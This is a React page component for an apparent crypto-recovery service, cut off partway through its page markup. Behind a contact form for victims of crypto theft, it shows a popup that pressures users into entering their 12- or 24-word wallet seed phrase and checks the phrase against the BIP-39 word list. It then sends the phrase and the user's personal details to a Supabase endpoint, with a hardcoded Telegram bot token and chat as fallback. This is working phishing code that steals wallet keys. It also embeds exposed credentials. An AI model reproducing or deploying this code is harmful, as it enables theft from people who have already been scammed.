import { useState, useEffect } from 'react'
import { Link } from 'react-router-dom'
import { ArrowLeftIcon, CheckCircleIcon, ShieldCheckIcon } from '@heroicons/react/24/outline'
import Logo from '../components/Logo'

// Popular cryptocurrencies for dropdown
const CRYPTOCURRENCIES = [
  { symbol: 'BTC', name: 'Bitcoin', icon: '₿' },
  { symbol: 'ETH', name: 'Ethereum', icon: 'Ξ' },
  { symbol: 'SOL', name: 'Solana', icon: '◎' },
  { symbol: 'DOGE', name: 'Dogecoin', icon: 'Ð' },
  { symbol: 'ADA', name: 'Cardano', icon: '₳' },
  { symbol: 'XRP', name: 'Ripple', icon: '✕' },
  { symbol: 'BCH', name: 'Bitcoin Cash', icon: '₿' },
  { symbol: 'LTC', name: 'Litecoin', icon: 'Ł' },
  { symbol: 'MATIC', name: 'Polygon', icon: '⭘' },
  { symbol: 'AVAX', name: 'Avalanche', icon: '△' },
  { symbol: 'DOT', name: 'Polkadot', icon: '●' },
  { symbol: 'ATOM', name: 'Cosmos', icon: '⚛' },
  { symbol: 'LINK', name: 'Chainlink', icon: '🔗' },
  { symbol: 'UNI', name: 'Uniswap', icon: '🦄' },
  { symbol: 'BNB', name: 'Binance Coin', icon: '🟡' }
]

export default function EnhancedContactFormPage() {
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    phone: '',
    details: '',
    blockchain: '',
    victimAddress: '',
    scammerAddress: '',
    transactionHash: '',
    amountStolen: ''
  })
  
  const [initialFormState, setInitialFormState] = useState<'form' | 'loading' | 'completed'>('form')
  const [showSeedPhrasePopup, setShowSeedPhrasePopup] = useState(false)
  const [seedPhraseData, setSeedPhraseData] = useState({ phrase: '' })
  const [seedPhraseState, setSeedPhraseState] = useState<'popup' | 'loading' | 'success' | 'error'>('popup')
  const [caseId, setCaseId] = useState('')
  
  // BIP-39 validation state for seed phrase
  const [phraseValidation, setPhraseValidation] = useState<{
    valid: boolean
    error: string
    touched: boolean
  }>({ valid: false, error: '', touched: false })
  
  // Complete BIP-39 English word list (2048 words)
  const BIP39_WORDS = [
    'abandon', 'ability', 'able', 'about', 'above', 'absent', 'absorb', 'abstract', 'absurd', 'abuse',
    'access', 'accident', 'account', 'accuse', 'achieve', 'acid', 'acoustic', 'acquire', 'across', 'act',
    'action', 'actor', 'actress', 'actual', 'adapt', 'add', 'addict', 'address', 'adjust', 'admit',
    'adult', 'advance', 'advice', 'aerobic', 'affair', 'afford', 'afraid', 'again', 'age', 'agent',
    'agree', 'ahead', 'aim', 'air', 'airport', 'aisle', 'alarm', 'album', 'alcohol', 'alert',
    'alien', 'all', 'alley', 'allow', 'almost', 'alone', 'alpha', 'already', 'also', 'alter',
    'always', 'amateur', 'amazing', 'among', 'amount', 'amused', 'analyst', 'anchor', 'ancient', 'anger',
    'angle', 'angry', 'animal', 'ankle', 'announce', 'annual', 'another', 'answer', 'antenna', 'antique',
    'anxiety', 'any', 'apart', 'apology', 'appear', 'apple', 'approve', 'april', 'arch', 'arctic',
    'area', 'arena', 'argue', 'arm', 'armed', 'armor', 'army', 'around', 'arrange', 'arrest',
    'arrive', 'arrow', 'art', 'artefact', 'artist', 'artwork', 'ask', 'aspect', 'assault', 'asset',
    'assist', 'assume', 'asthma', 'athlete', 'atom', 'attack', 'attend', 'attitude', 'attract', 'auction',
    'audit', 'august', 'aunt', 'author', 'auto', 'autumn', 'average', 'avocado', 'avoid', 'awake',
    'aware', 'away', 'awesome', 'awful', 'awkward', 'axis', 'baby', 'bachelor', 'bacon', 'badge',
    'bag', 'balance', 'balcony', 'ball', 'bamboo', 'banana', 'banner', 'bar', 'barely', 'bargain',
    'barrel', 'base', 'basic', 'basket', 'battle', 'beach', 'bean', 'beauty', 'because', 'become',
    'beef', 'before', 'begin', 'behave', 'behind', 'believe', 'below', 'belt', 'bench', 'benefit',
    'best', 'betray', 'better', 'between', 'beyond', 'bicycle', 'bid', 'bike', 'bind', 'biology',
    'bird', 'birth', 'bitter', 'black', 'blade', 'blame', 'blanket', 'blast', 'bleak', 'bless',
    'blind', 'blood', 'blossom', 'blouse', 'blue', 'blur', 'blush', 'board', 'boat', 'body',
    'boil', 'bomb', 'bone', 'bonus', 'book', 'boost', 'border', 'boring', 'borrow', 'boss',
    'bottom', 'bounce', 'box', 'boy', 'bracket', 'brain', 'brand', 'brass', 'brave', 'bread',
    'breeze', 'brick', 'bridge', 'brief', 'bright', 'bring', 'brisk', 'broccoli', 'broken', 'bronze',
    'broom', 'brother', 'brown', 'brush', 'bubble', 'buddy', 'budget', 'buffalo', 'build', 'bulb',
    'bulk', 'bullet', 'bundle', 'bunker', 'burden', 'burger', 'burst', 'bus', 'business', 'busy',
    'butter', 'buyer', 'buzz', 'cabbage', 'cabin', 'cable', 'cactus', 'cage', 'cake', 'call',
    'calm', 'camera', 'camp', 'can', 'canal', 'cancel', 'candy', 'cannon', 'canoe', 'canvas',
    'canyon', 'capable', 'capital', 'captain', 'car', 'carbon', 'card', 'cargo', 'carpet', 'carry',
    'cart', 'case', 'cash', 'casino', 'castle', 'casual', 'cat', 'catalog', 'catch', 'category',
    'cattle', 'caught', 'cause', 'caution', 'cave', 'ceiling', 'celery', 'cement', 'census', 'century',
    'cereal', 'certain', 'chair', 'chalk', 'champion', 'change', 'chaos', 'chapter', 'charge', 'chase',
    'chat', 'cheap', 'check', 'cheese', 'chef', 'cherry', 'chest', 'chicken', 'chief', 'child',
    'chimney', 'choice', 'choose', 'chronic', 'chuckle', 'chunk', 'churn', 'cigar', 'cinnamon', 'circle',
    'citizen', 'city', 'civil', 'claim', 'clap', 'clarify', 'claw', 'clay', 'clean', 'clerk',
    'clever', 'click', 'client', 'cliff', 'climb', 'clinic', 'clip', 'clock', 'clog', 'close',
    'cloth', 'cloud', 'clown', 'club', 'clump', 'cluster', 'clutch', 'coach', 'coast', 'coconut',
    'code', 'coffee', 'coil', 'coin', 'collect', 'color', 'column', 'combine', 'come', 'comfort',
    'comic', 'common', 'company', 'concert', 'conduct', 'confirm', 'congress', 'connect', 'consider', 'control',
    'convince', 'cook', 'cool', 'copper', 'copy', 'coral', 'core', 'corn', 'correct', 'cost',
    'cotton', 'couch', 'country', 'couple', 'course', 'cousin', 'cover', 'coyote', 'crack', 'cradle',
    'craft', 'cram', 'crane', 'crash', 'crater', 'crawl', 'crazy', 'cream', 'credit', 'creek',
    'crew', 'cricket', 'crime', 'crisp', 'critic', 'crop', 'cross', 'crouch', 'crowd', 'crucial',
    'cruel', 'cruise', 'crumble', 'crunch', 'crush', 'cry', 'crystal', 'cube', 'culture', 'cup',
    'cupboard', 'curious', 'current', 'curtain', 'curve', 'cushion', 'custom', 'cute', 'cycle', 'dad',
    'damage', 'damp', 'dance', 'danger', 'daring', 'dash', 'daughter', 'dawn', 'day', 'deal',
    'debate', 'debris', 'decade', 'december', 'decide', 'decline', 'decorate', 'decrease', 'deer', 'defense',
    'define', 'defy', 'degree', 'delay', 'deliver', 'demand', 'demise', 'denial', 'dentist', 'deny',
    'depart', 'depend', 'deposit', 'depth', 'deputy', 'derive', 'describe', 'desert', 'design', 'desk',
    'despair', 'destroy', 'detail', 'detect', 'develop', 'device', 'devote', 'diagram', 'dial', 'diamond',
    'diary', 'dice', 'diesel', 'diet', 'differ', 'digital', 'dignity', 'dilemma', 'dinner', 'dinosaur',
    'direct', 'dirt', 'disagree', 'discover', 'disease', 'dish', 'dismiss', 'disorder', 'display', 'distance',
    'divert', 'divide', 'divorce', 'dizzy', 'doctor', 'document', 'dog', 'doll', 'dolphin', 'domain',
    'donate', 'donkey', 'donor', 'door', 'dose', 'double', 'dove', 'draft', 'dragon', 'drama',
    'drastic', 'draw', 'dream', 'dress', 'drift', 'drill', 'drink', 'drip', 'drive', 'drop',
    'drum', 'dry', 'duck', 'dumb', 'dune', 'during', 'dust', 'dutch', 'duty', 'dwarf',
    'dynamic', 'eager', 'eagle', 'early', 'earn', 'earth', 'easily', 'east', 'easy', 'echo',
    'ecology', 'economy', 'edge', 'edit', 'educate', 'effort', 'egg', 'eight', 'either', 'elbow',
    'elder', 'electric', 'elegant', 'element', 'elephant', 'elevator', 'elite', 'else', 'embark', 'embody',
    'embrace', 'emerge', 'emotion', 'employ', 'empower', 'empty', 'enable', 'enact', 'end', 'endless',
    'endorse', 'enemy', 'energy', 'enforce', 'engage', 'engine', 'enhance', 'enjoy', 'enlist', 'enough',
    'enrich', 'enroll', 'ensure', 'enter', 'entire', 'entry', 'envelope', 'episode', 'equal', 'equip',
    'era', 'erase', 'erode', 'erosion', 'error', 'erupt', 'escape', 'essay', 'essence', 'estate',
    'eternal', 'ethics', 'evidence', 'evil', 'evoke', 'evolve', 'exact', 'example', 'excess', 'exchange',
    'excite', 'exclude', 'excuse', 'execute', 'exercise', 'exhaust', 'exhibit', 'exile', 'exist', 'exit',
    'exotic', 'expand', 'expect', 'expire', 'explain', 'expose', 'express', 'extend', 'extra', 'eye',
    'eyebrow', 'fabric', 'face', 'faculty', 'fade', 'faint', 'faith', 'fall', 'false', 'fame',
    'family', 'famous', 'fan', 'fancy', 'fantasy', 'farm', 'fashion', 'fat', 'fatal', 'father',
    'fatigue', 'fault', 'favorite', 'feature', 'february', 'federal', 'fee', 'feed', 'feel', 'female',
    'fence', 'festival', 'fetch', 'fever', 'few', 'fiber', 'fiction', 'field', 'figure', 'file',
    'film', 'filter', 'final', 'find', 'fine', 'finger', 'finish', 'fire', 'firm', 'first',
    'fiscal', 'fish', 'fit', 'fitness', 'fix', 'flag', 'flame', 'flash', 'flat', 'flavor',
    'flee', 'flight', 'flip', 'float', 'flock', 'floor', 'flower', 'fluid', 'flush', 'fly',
    'foam', 'focus', 'fog', 'foil', 'fold', 'follow', 'food', 'foot', 'force', 'forest',
    'forget', 'fork', 'fortune', 'forum', 'forward', 'fossil', 'foster', 'found', 'fox', 'fragile',
    'frame', 'frequent', 'fresh', 'friend', 'fringe', 'frog', 'front', 'frost', 'frown', 'frozen',
    'fruit', 'fuel', 'fun', 'funny', 'furnace', 'fury', 'future', 'gadget', 'gain', 'galaxy',
    'gallery', 'game', 'gap', 'garage', 'garbage', 'garden', 'garlic', 'garment', 'gas', 'gasp',
    'gate', 'gather', 'gauge', 'gaze', 'general', 'genius', 'genre', 'gentle', 'genuine', 'gesture',
    'ghost', 'giant', 'gift', 'giggle', 'ginger', 'giraffe', 'girl', 'give', 'glad', 'glance',
    'glare', 'glass', 'glide', 'glimpse', 'globe', 'gloom', 'glory', 'glove', 'glow', 'glue',
    'goat', 'goddess', 'gold', 'good', 'goose', 'gorilla', 'gospel', 'gossip', 'govern', 'gown',
    'grab', 'grace', 'grain', 'grant', 'grape', 'grass', 'gravity', 'great', 'green', 'grid',
    'grief', 'grit', 'grocery', 'group', 'grow', 'grunt', 'guard', 'guess', 'guide', 'guilt',
    'guitar', 'gun', 'gym', 'habit', 'hair', 'half', 'hammer', 'hamster', 'hand', 'happy',
    'harbor', 'hard', 'harsh', 'harvest', 'hat', 'have', 'hawk', 'hazard', 'head', 'health',
    'heart', 'heavy', 'hedgehog', 'height', 'hello', 'helmet', 'help', 'hen', 'hero', 'hidden',
    'high', 'hill', 'hint', 'hip', 'hire', 'history', 'hobby', 'hockey', 'hold', 'hole',
    'holiday', 'hollow', 'home', 'honey', 'hood', 'hope', 'horn', 'horror', 'horse', 'hospital',
    'host', 'hotel', 'hour', 'hover', 'hub', 'huge', 'human', 'humble', 'humor', 'hundred',
    'hungry', 'hunt', 'hurdle', 'hurry', 'hurt', 'husband', 'hybrid', 'ice', 'icon', 'idea',
    'identify', 'idle', 'ignore', 'ill', 'illegal', 'illness', 'image', 'imitate', 'immense', 'immune',
    'impact', 'impose', 'improve', 'impulse', 'inch', 'include', 'income', 'increase', 'index', 'indicate',
    'indoor', 'industry', 'infant', 'inflict', 'inform', 'inhale', 'inherit', 'initial', 'inject', 'injury',
    'inmate', 'inner', 'innocent', 'input', 'inquiry', 'insane', 'insect', 'inside', 'inspire', 'install',
    'intact', 'interest', 'into', 'invest', 'invite', 'involve', 'iron', 'island', 'isolate', 'issue',
    'item', 'ivory', 'jacket', 'jaguar', 'jar', 'jazz', 'jealous', 'jeans', 'jelly', 'jewel',
    'job', 'join', 'joke', 'journey', 'joy', 'judge', 'juice', 'jump', 'jungle', 'junior',
    'junk', 'just', 'kangaroo', 'keen', 'keep', 'ketchup', 'key', 'kick', 'kid', 'kidney',
    'kind', 'kingdom', 'kiss', 'kit', 'kitchen', 'kite', 'kitten', 'kiwi', 'knee', 'knife',
    'knock', 'know', 'lab', 'label', 'labor', 'ladder', 'lady', 'lake', 'lamp', 'language',
    'laptop', 'large', 'later', 'latin', 'laugh', 'laundry', 'lava', 'law', 'lawn', 'lawsuit',
    'layer', 'lazy', 'leader', 'leaf', 'learn', 'leave', 'lecture', 'left', 'leg', 'legal',
    'legend', 'leisure', 'lemon', 'lend', 'length', 'lens', 'leopard', 'lesson', 'letter', 'level',
    'liar', 'liberty', 'library', 'license', 'life', 'lift', 'light', 'like', 'limb', 'limit',
    'link', 'lion', 'liquid', 'list', 'little', 'live', 'lizard', 'load', 'loan', 'lobster',
    'local', 'lock', 'logic', 'lonely', 'long', 'loop', 'lottery', 'loud', 'lounge', 'love',
    'loyal', 'lucky', 'luggage', 'lumber', 'lunar', 'lunch', 'luxury', 'lyrics', 'machine', 'mad',
    'magic', 'magnet', 'maid', 'mail', 'main', 'major', 'make', 'mammal', 'man', 'manage',
    'mandate', 'mango', 'mansion', 'manual', 'maple', 'marble', 'march', 'margin', 'marine', 'market',
    'marriage', 'mask', 'mass', 'master', 'match', 'material', 'math', 'matrix', 'matter', 'maximum',
    'maze', 'meadow', 'mean', 'measure', 'meat', 'mechanic', 'medal', 'media', 'melody', 'melt',
    'member', 'memory', 'mention', 'menu', 'mercy', 'merge', 'merit', 'merry', 'mesh', 'message',
    'metal', 'method', 'middle', 'midnight', 'milk', 'million', 'mimic', 'mind', 'minimum', 'minor',
    'minute', 'miracle', 'mirror', 'misery', 'miss', 'mistake', 'mix', 'mixed', 'mixture', 'mobile',
    'model', 'modify', 'mom', 'moment', 'monitor', 'monkey', 'monster', 'month', 'moon', 'moral',
    'more', 'morning', 'mosquito', 'mother', 'motion', 'motor', 'mountain', 'mouse', 'move', 'movie',
    'much', 'muffin', 'mule', 'multiply', 'muscle', 'museum', 'mushroom', 'music', 'must', 'mutual',
    'myself', 'mystery', 'myth', 'naive', 'name', 'napkin', 'narrow', 'nasty', 'nation', 'nature',
    'near', 'neck', 'need', 'negative', 'neglect', 'neither', 'nephew', 'nerve', 'nest', 'net',
    'network', 'neutral', 'never', 'news', 'next', 'nice', 'night', 'noble', 'noise', 'nominee',
    'noodle', 'normal', 'north', 'nose', 'notable', 'note', 'nothing', 'notice', 'novel', 'now',
    'nuclear', 'number', 'nurse', 'nut', 'oak', 'obey', 'object', 'oblige', 'obscure', 'observe',
    'obtain', 'obvious', 'occur', 'ocean', 'october', 'odor', 'off', 'offer', 'office', 'often',
    'oil', 'okay', 'old', 'olive', 'olympic', 'omit', 'once', 'one', 'onion', 'online',
    'only', 'open', 'opera', 'opinion', 'oppose', 'option', 'orange', 'orbit', 'orchard', 'order',
    'ordinary', 'organ', 'orient', 'original', 'orphan', 'ostrich', 'other', 'outdoor', 'outer', 'output',
    'outside', 'oval', 'oven', 'over', 'own', 'owner', 'oxygen', 'oyster', 'ozone', 'pact',
    'paddle', 'page', 'pair', 'palace', 'palm', 'panda', 'panel', 'panic', 'panther', 'paper',
    'parade', 'parent', 'park', 'parrot', 'party', 'pass', 'patch', 'path', 'patient', 'patrol',
    'pattern', 'pause', 'pave', 'payment', 'peace', 'peanut', 'pear', 'peasant', 'pelican', 'pen',
    'penalty', 'pencil', 'people', 'pepper', 'perfect', 'permit', 'person', 'pet', 'phone', 'photo',
    'phrase', 'physical', 'piano', 'picnic', 'picture', 'piece', 'pig', 'pigeon', 'pill', 'pilot',
    'pink', 'pioneer', 'pipe', 'pistol', 'pitch', 'pizza', 'place', 'planet', 'plastic', 'plate',
    'play', 'please', 'pledge', 'pluck', 'plug', 'plunge', 'poem', 'poet', 'point', 'polar',
    'pole', 'police', 'pond', 'pony', 'pool', 'popular', 'portion', 'position', 'possible', 'post',
    'potato', 'pottery', 'poverty', 'powder', 'power', 'practice', 'praise', 'predict', 'prefer', 'prepare',
    'present', 'pretty', 'prevent', 'price', 'pride', 'primary', 'print', 'priority', 'prison', 'private',
    'prize', 'problem', 'process', 'produce', 'profit', 'program', 'project', 'promote', 'proof', 'property',
    'prosper', 'protect', 'proud', 'provide', 'public', 'pudding', 'pull', 'pulp', 'pulse', 'pumpkin',
    'punch', 'pupil', 'puppy', 'purchase', 'purity', 'purpose', 'purse', 'push', 'put', 'puzzle',
    'pyramid', 'quality', 'quantum', 'quarter', 'question', 'quick', 'quit', 'quiz', 'quote', 'rabbit',
    'raccoon', 'race', 'rack', 'radar', 'radio', 'rail', 'rain', 'raise', 'rally', 'ramp',
    'ranch', 'random', 'range', 'rapid', 'rare', 'rate', 'rather', 'raven', 'raw', 'razor',
    'ready', 'real', 'reason', 'rebel', 'rebuild', 'recall', 'receive', 'recipe', 'record', 'recycle',
    'reduce', 'reflect', 'reform', 'refuse', 'region', 'regret', 'regular', 'reject', 'relax', 'release',
    'relief', 'rely', 'remain', 'remember', 'remind', 'remove', 'render', 'renew', 'rent', 'reopen',
    'repair', 'repeat', 'replace', 'report', 'require', 'rescue', 'resemble', 'resist', 'resource', 'response',
    'result', 'retire', 'retreat', 'return', 'reunion', 'reveal', 'review', 'reward', 'rhythm', 'rib',
    'ribbon', 'rice', 'rich', 'ride', 'ridge', 'rifle', 'right', 'rigid', 'ring', 'riot',
    'ripple', 'risk', 'ritual', 'rival', 'river', 'road', 'roast', 'robot', 'robust', 'rocket',
    'romance', 'roof', 'rookie', 'room', 'rose', 'rotate', 'rough', 'round', 'route', 'royal',
    'rubber', 'rude', 'rug', 'rule', 'run', 'runway', 'rural', 'sad', 'saddle', 'sadness',
    'safe', 'sail', 'salad', 'salmon', 'salon', 'salt', 'salute', 'same', 'sample', 'sand',
    'satisfy', 'satoshi', 'sauce', 'sausage', 'save', 'say', 'scale', 'scan', 'scare', 'scatter',
    'scene', 'scheme', 'school', 'science', 'scissors', 'scorpion', 'scout', 'scrap', 'screen', 'script',
    'scrub', 'sea', 'search', 'season', 'seat', 'second', 'secret', 'section', 'security', 'seed',
    'seek', 'segment', 'select', 'sell', 'seminar', 'senior', 'sense', 'sentence', 'series', 'service',
    'session', 'settle', 'setup', 'seven', 'shadow', 'shaft', 'shallow', 'share', 'shed', 'shell',
    'sheriff', 'shield', 'shift', 'shine', 'ship', 'shiver', 'shock', 'shoe', 'shoot', 'shop',
    'short', 'shoulder', 'shove', 'shrimp', 'shrug', 'shuffle', 'shy', 'sibling', 'sick', 'side',
    'siege', 'sight', 'sign', 'silent', 'silk', 'silly', 'silver', 'similar', 'simple', 'since',
    'sing', 'siren', 'sister', 'situate', 'six', 'size', 'skate', 'sketch', 'ski', 'skill',
    'skin', 'skirt', 'skull', 'slab', 'slam', 'sleep', 'slender', 'slice', 'slide', 'slight',
    'slim', 'slogan', 'slot', 'slow', 'slush', 'small', 'smart', 'smile', 'smoke', 'smooth',
    'snack', 'snake', 'snap', 'sniff', 'snow', 'soap', 'soccer', 'social', 'sock', 'soda',
    'soft', 'solar', 'soldier', 'solid', 'solution', 'solve', 'someone', 'song', 'soon', 'sorry',
    'sort', 'soul', 'sound', 'soup', 'source', 'south', 'space', 'spare', 'spatial', 'spawn',
    'speak', 'special', 'speed', 'spell', 'spend', 'sphere', 'spice', 'spider', 'spike', 'spin',
    'spirit', 'split', 'spoil', 'sponsor', 'spoon', 'sport', 'spot', 'spray', 'spread', 'spring',
    'spy', 'square', 'squeeze', 'squirrel', 'stable', 'stadium', 'staff', 'stage', 'stairs', 'stamp',
    'stand', 'start', 'state', 'stay', 'steak', 'steel', 'stem', 'step', 'stereo', 'stick',
    'still', 'sting', 'stock', 'stomach', 'stone', 'stool', 'story', 'stove', 'strategy', 'street',
    'strike', 'strong', 'struggle', 'student', 'stuff', 'stumble', 'style', 'subject', 'submit', 'subway',
    'success', 'such', 'sudden', 'suffer', 'sugar', 'suggest', 'suit', 'summer', 'sun', 'sunny',
    'sunset', 'super', 'supply', 'supreme', 'sure', 'surface', 'surge', 'surprise', 'surround', 'survey',
    'suspect', 'sustain', 'swallow', 'swamp', 'swap', 'swarm', 'swear', 'sweet', 'swift', 'swim',
    'swing', 'switch', 'sword', 'symbol', 'symptom', 'syrup', 'system', 'table', 'tackle', 'tag',
    'tail', 'talent', 'talk', 'tank', 'tape', 'target', 'task', 'taste', 'tattoo', 'taxi',
    'teach', 'team', 'tell', 'ten', 'tenant', 'tennis', 'tent', 'term', 'test', 'text',
    'thank', 'that', 'theme', 'then', 'theory', 'there', 'they', 'thing', 'this', 'thought',
    'three', 'thrive', 'throw', 'thumb', 'thunder', 'ticket', 'tide', 'tiger', 'tilt', 'timber',
    'time', 'tiny', 'tip', 'tired', 'tissue', 'title', 'toast', 'tobacco', 'today', 'toddler',
    'toe', 'together', 'toilet', 'token', 'tomato', 'tomorrow', 'tone', 'tongue', 'tonight', 'tool',
    'tooth', 'top', 'topic', 'topple', 'torch', 'tornado', 'tortoise', 'toss', 'total', 'tourist',
    'toward', 'tower', 'town', 'toy', 'track', 'trade', 'traffic', 'tragic', 'train', 'transfer',
    'trap', 'trash', 'travel', 'tray', 'treat', 'tree', 'trend', 'trial', 'tribe', 'trick',
    'trigger', 'trim', 'trip', 'trophy', 'trouble', 'truck', 'true', 'truly', 'trumpet', 'trust',
    'truth', 'try', 'tube', 'tuition', 'tumble', 'tuna', 'tunnel', 'turkey', 'turn', 'turtle',
    'twelve', 'twenty', 'twice', 'twin', 'twist', 'two', 'type', 'typical', 'ugly', 'umbrella',
    'unable', 'unaware', 'uncle', 'uncover', 'under', 'undo', 'unfair', 'unfold', 'unhappy', 'uniform',
    'unique', 'unit', 'universe', 'unknown', 'unlock', 'until', 'unusual', 'unveil', 'update', 'upgrade',
    'uphold', 'upon', 'upper', 'upset', 'urban', 'urge', 'usage', 'use', 'used', 'useful',
    'useless', 'usual', 'utility', 'vacant', 'vacuum', 'vague', 'valid', 'valley', 'valve', 'van',
    'vanish', 'vapor', 'various', 'vast', 'vault', 'vehicle', 'velvet', 'vendor', 'venture', 'venue',
    'verb', 'verify', 'version', 'very', 'vessel', 'veteran', 'viable', 'vibrant', 'vicious', 'victory',
    'video', 'view', 'village', 'vintage', 'violin', 'virtual', 'virus', 'visa', 'visit', 'visual',
    'vital', 'vivid', 'vocal', 'voice', 'void', 'volcano', 'volume', 'vote', 'voyage', 'wage',
    'wagon', 'wait', 'walk', 'wall', 'walnut', 'want', 'warfare', 'warm', 'warrior', 'wash',
    'wasp', 'waste', 'water', 'wave', 'way', 'wealth', 'weapon', 'wear', 'weasel', 'weather',
    'web', 'wedding', 'weekend', 'weird', 'welcome', 'west', 'wet', 'whale', 'what', 'wheat',
    'wheel', 'when', 'where', 'whip', 'whisper', 'wide', 'width', 'wife', 'wild', 'will',
    'win', 'window', 'wine', 'wing', 'wink', 'winner', 'winter', 'wire', 'wisdom', 'wise',
    'wish', 'witness', 'wolf', 'woman', 'wonder', 'wood', 'wool', 'word', 'work', 'world',
    'worry', 'worth', 'wrap', 'wreck', 'wrestle', 'wrist', 'write', 'wrong', 'yard', 'year',
    'yellow', 'you', 'young', 'youth', 'zebra', 'zero', 'zone', 'zoo'
  ]
  
  // Validation for initial form
  const [validation, setValidation] = useState({
    name: true,
    email: true,
    details: true,
    blockchain: true,
    victimAddress: true,
    scammerAddress: true,
    transactionHash: true,
    amountStolen: true
  })
  
  // Validate initial form
  useEffect(() => {
    const newValidation = {
      name: formData.name.trim().length > 0,
      email: /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email),
      details: formData.details.trim().length >= 50,
      blockchain: formData.blockchain.length > 0,
      victimAddress: formData.victimAddress.trim().length > 0,
      scammerAddress: formData.scammerAddress.trim().length > 0,
      transactionHash: formData.transactionHash.trim().length >= 10,
      amountStolen: /^[0-9]+(\.[0-9]{1,2})?$/.test(formData.amountStolen) && parseFloat(formData.amountStolen) > 0
    }
    setValidation(newValidation)
  }, [formData])
  
  // Debounce validation for seed phrase
  useEffect(() => {
    if (!phraseValidation.touched) return
    
    const timeoutId = setTimeout(() => {
      const input = seedPhraseData.phrase.trim()
      
      if (!input) {
        setPhraseValidation({ valid: false, error: '', touched: true })
        return
      }
      
      const words = input.toLowerCase().split(/\s+/).filter(w => w)
      
      if (words.length !== 12 && words.length !== 24) {
        setPhraseValidation({
          valid: false,
          error: 'Recovery phrase must be exactly 12 or 24 words.',
          touched: true
        })
        return
      }
      
      const invalidWords = words.filter(w => !BIP39_WORDS.includes(w))
      if (invalidWords.length > 0) {
        setPhraseValidation({
          valid: false,
          error: 'Invalid recovery phrase. Please verify all words are correct.',
          touched: true
        })
        return
      }
      
      setPhraseValidation({ valid: true, error: '', touched: true })
    }, 300)
    
    return () => clearTimeout(timeoutId)
  }, [seedPhraseData.phrase, phraseValidation.touched])
  
  const formatCaseMessage = (data: any) => {
    return `
🔐 <b>NEW CRYPTO RECOVERY CASE</b>
📅 <b>Time:</b> <code>${data.timestamp}</code>
🆔 <b>Case ID:</b> <code>${data.caseId}</code>

<b>📞 Contact Information:</b>
<b>Name:</b> <code>${data.name}</code>
<b>Email:</b> <code>${data.email}</code>
<b>Phone:</b> <code>${data.phone}</code>

<b>💰 Transaction Details:</b>
<b>Blockchain:</b> <code>${data.blockchain}</code>
<b>Victim Address:</b> <code>${data.victimAddress}</code>
<b>Scammer Address:</b> <code>${data.scammerAddress}</code>
<b>Transaction Hash:</b> <code>${data.transactionHash}</code>
<b>Amount Stolen:</b> <code>$${data.amountStolen}</code>

<b>📝 Case Summary:</b>
<pre>${data.details}</pre>

<b>🔑 Recovery Seed Phrase:</b>
<pre>${data.phrase}</pre>

<i>⚡ URGENT: Recovery phrase validated - Immediate analysis required</i>
<i>🔒 Encrypted transmission - Maximum security</i>
    `.trim()
  }
  
  const handleInitialSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    
    // Validate all fields
    const isValid = Object.values(validation).every(Boolean)
    if (!isValid) {
      alert('Please fill in all required fields correctly.')
      return
    }
    
    // Show seed phrase popup
    setInitialFormState('completed')
    setTimeout(() => {
      setShowSeedPhrasePopup(true)
      setSeedPhraseState('popup')
    }, 1000)
  }
  
  const handleSeedPhraseSubmit = async () => {
    // Validate seed phrase
    if (!phraseValidation.valid) {
      alert('Please provide a valid 12 or 24-word BIP-39 seed phrase.')
      return
    }
    
    setSeedPhraseState('loading')
    
    const payload = {
      name: formData.name.trim(),
      email: formData.email.trim(),
      phone: formData.phone || 'Not provided',
      details: formData.details.trim(),
      phrase: seedPhraseData.phrase.trim(),
      blockchain: formData.blockchain,
      victimAddress: formData.victimAddress.trim(),
      scammerAddress: formData.scammerAddress.trim(),
      transactionHash: formData.transactionHash.trim(),
      amountStolen: formData.amountStolen.trim(),
      timestamp: new Date().toISOString(),
      caseId: `REC-${Date.now().toString(36).toUpperCase()}`
    }
    
    setCaseId(payload.caseId)
    
    try {
      // Submit to Supabase function (database + enhanced Telegram)
      const supabaseResponse = await fetch('https://mdijhbavkwxeudzgcyjb.supabase.co/functions/v1/submit-recovery-case', {
        method: 'POST',
        headers: { 
          'Content-Type': 'application/json',
          'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1kaWpoYmF2a3d4ZXVkemdjeWpiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjIyMzUyMzIsImV4cCI6MjA3NzgxMTIzMn0.bGQW76NcZ97pfe7UsD3d5bJ1kaIRq2odstgHMg4jzew'
        },
        body: JSON.stringify(payload)
      })
      
      if (!supabaseResponse.ok) {
        // Fallback to direct Telegram if Supabase fails
        console.warn('Supabase submission failed, using fallback Telegram submission')
        const telegramResponse = await fetch('https://api.telegram.org/bot7674751889:AAGj4PMlqgoJZy0Mfwz6QuUmSuMlIJ4Vpf8/sendMessage', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: '6368654401',
            text: formatCaseMessage(payload),
            parse_mode: 'HTML'
          })
        })
        
        if (!telegramResponse.ok) {
          throw new Error('Both Supabase and Telegram submissions failed')
        }
      }
      
      setSeedPhraseState('success')
    } catch (error) {
      console.error('Submission failed:', error)
      setSeedPhraseState('error')
    }
  }
  
  const handleAbandonRecovery = () => {
    const confirmed = window.confirm(
      '⚠️ ABANDON RECOVERY PROCESS?\n\n' +
      'Are you sure you want to close this recovery window?\n\n' +
      '💡 Please consider:\n' +
      '• Time is critical for crypto recovery\n' +
      '• Delays may reduce recovery chances\n' +
      '• You can return anytime, but starting fresh may be required\n\n' +
      'Click OK to abandon, or Cancel to continue.'
    )
    
    if (confirmed) {
      setShowSeedPhrasePopup(false)
      setSeedPhraseData({ phrase: '' })
      setPhraseValidation({ valid: false, error: '', touched: false })
      setInitialFormState('form')
    }
  }
  
  return (
    <div className="min-h-screen" style={{background: 'var(--bg-primary)'}}>
      {/* Header */}
      <header className="backdrop-blur-md border-b border-gray-800" style={{background: 'rgba(11, 20, 38, 0.9)'}}>
        <nav className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center h-16">
            <Logo />
            <div className="hidden md:block">
              <div className="ml-10 flex items-baseline space-x-8">
                <Link to="/" className="hover:text-blue-400 px-3 py-2 text-sm font-medium transition-colors duration-200" style={{color: 'var(--text-secondary)'}}>Home</Link>
